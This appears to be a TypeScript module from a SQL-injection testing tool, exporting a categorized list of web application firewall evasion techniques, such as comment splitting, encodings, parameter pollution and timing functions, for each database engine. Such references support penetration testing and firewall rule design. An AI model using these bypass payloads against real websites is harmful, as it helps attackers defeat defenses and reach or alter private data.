/** WAF/IPS bypass map — comprehensive, deterministic, categorized.
 *
 *  Covers the full SQLi (and blind-SQLi) WAF-evasion surface: comment-space,
 *  function/paren split, keyword splitting, whitespace alternatives, case
 *  obfuscation, encoding, string obfuscation, operator alternatives, keyword
 *  alternatives, HTTP-level, plus per-DBMS techniques. Ordered by effectiveness.
 */

export type WafBypassDbms = "mysql" | "postgresql" | "mssql" | "oracle" | "sqlite" | "generic";

export interface WafBypassGroup {
  category: string;
  techniques: string[];
}

/** Generic techniques — apply to every DBMS. */
export const WAF_BYPASS_GENERIC: WafBypassGroup[] = [
  {
    category: "comment-space",
    techniques: [
      "/**/ replace spaces (also between keywords UN/**/ION)",
      "/**x**/ comment with content as space",
      "-- - line comment terminator",
      "# line comment (MySQL)",
      ";%00 null-byte terminator (stops WAF at NUL)",
    ],
  },
  {
    category: "func-paren-split",
    techniques: [
      "SUBSTRING/**/(...) — comment between function name and (",
      "SUBSTR/*x*/(...) — comment with content",
      "FUNC/*!50000*/(...) — version-gated inline comment (MySQL)",
    ],
  },
  {
    category: "keyword-split",
    techniques: [
      "SUBST/**/RING — split a keyword with a comment",
      "SEL/**/ECT / UN/**/ION — split reserved words",
      "information/**/schema — split identifier",
    ],
  },
  {
    category: "whitespace-alt",
    techniques: [
      "%09 tab, %0a LF, %0b VT, %0c FF, %0d CR, %a0 NBSP — replace spaces",
      "+ URL-space in query params",
    ],
  },
  {
    category: "case-obfuscation",
    techniques: [
      "sUbStRiNg / SeLeCt / UnIoN — case swap beats case-sensitive filters",
      "miXeD CaSe on WAF keywords",
    ],
  },
  {
    category: "encoding",
    techniques: [
      "%27 single quote, %20 space, %2527 double-encode",
      "%u0027 IIS unicode quote",
      "0x414243 hex literal for 'ABC'",
      "\\x27 / \\u0027 backslash-hex / unicode char",
    ],
  },
  {
    category: "string-obfuscation",
    techniques: [
      "CHAR(39) / CONCAT(CHAR(39),...) — build quotes from char codes",
      "CONCAT(0x61,0x62) — hex-char concatenation",
      "'x' -> \"x\" double-quote swap",
      "\\' backslash-escape the quote",
    ],
  },
  {
    category: "operator-alt",
    techniques: [
      "= -> LIKE / REGEXP / BETWEEN / IN",
      "AND -> && , OR -> ||",
      "SUBSTRING -> MID / SUBSTR (MySQL aliases)",
    ],
  },
  {
    category: "keyword-alt",
    techniques: [
      "UNION SELECT -> UNION ALL SELECT / UNION DISTINCT SELECT",
      "SLEEP -> BENCHMARK(10000000,MD5(1)) (MySQL)",
      "information_schema -> /*!50000information_schema*/ (MySQL)",
    ],
  },
  {
    category: "http-level",
    techniques: [
      "HPP parameter pollution: IDStr=1&IDStr=<payload> (last/first-wins)",
      "HTTP verb tampering: GET <-> POST",
      "Content-Type swap: multipart/form-data / application/json",
      "chunked transfer encoding to split payload",
      "X-Forwarded-For / X-Originating-IP header injection",
    ],
  },
];

/** Per-DBMS techniques. */
export const WAF_BYPASS_DBMS: Record<WafBypassDbms, WafBypassGroup[]> = {
  generic: [],
  mysql: [
    {
      category: "mysql-specific",
      techniques: [
        "/*!50000...*/ inline comment — MySQL executes, old WAF ignores",
        "BENCHMARK(10000000,MD5(1)) as SLEEP alternative",
        "backtick obfuscation: SELECT `column` FROM `table`",
        "-- - and # comment terminators",
        "0x... hex strings, _utf8 charset prefix",
      ],
    },
  ],
  postgresql: [
    {
      category: "postgresql-specific",
      techniques: [
        "$$ dollar-quoted strings: $$x$$ avoids single-quote filters",
        "|| string concatenation",
        "pg_sleep(5) / pg_sleep via SELECT pg_sleep(5)",
        "-- and /* */ comments",
        "CAST(x AS text) to bypass type checks",
      ],
    },
  ],
  mssql: [
    {
      category: "mssql-specific",
      techniques: [
        "WAITFOR DELAY '0:0:5' time oracle",
        ";-- and /**/ comments",
        "%00 null byte",
        "sp_ / xp_ prefixed procedures",
        "OPENROWSET / OPENDATASOURCE for external calls",
      ],
    },
  ],
  oracle: [
    {
      category: "oracle-specific",
      techniques: [
        "--+ comment",
        "/* */ comments, || concatenation",
        "dbms_lock.sleep(5) / UTL_INADDR.get_host_address for time",
        "FROM dual everywhere",
        "ROWNUM pagination",
      ],
    },
  ],
  sqlite: [
    {
      category: "sqlite-specific",
      techniques: [
        "/**/ and -- comments",
        "|| concatenation",
        "randomblob(N) as time oracle",
        "sqlite_master instead of information_schema",
        "attached DBs via ATTACH DATABASE",
      ],
    },
  ],
};

/** Flat list of every generic technique (for the blind_sqli backward-compat export). */
export const WAF_BYPASS_FLAT: string[] = WAF_BYPASS_GENERIC.flatMap((g) => g.techniques);

/** Return the WAF bypass playbook for a DBMS (generic + dbms-specific groups). */
export function wafBypass(dbms?: string): { generic: WafBypassGroup[]; dbms_specific: WafBypassGroup[]; dbms: string } {
  const key = ((dbms ?? "").toLowerCase() || "generic") as WafBypassDbms;
  return {
    dbms: key,
    generic: WAF_BYPASS_GENERIC,
    dbms_specific: WAF_BYPASS_DBMS[key] ?? [],
  };
}

/** List DBMS with a specific bypass set. */
export function listWafBypassDbms(): string[] {
  return Object.keys(WAF_BYPASS_DBMS).filter((k) => k !== "generic");
}
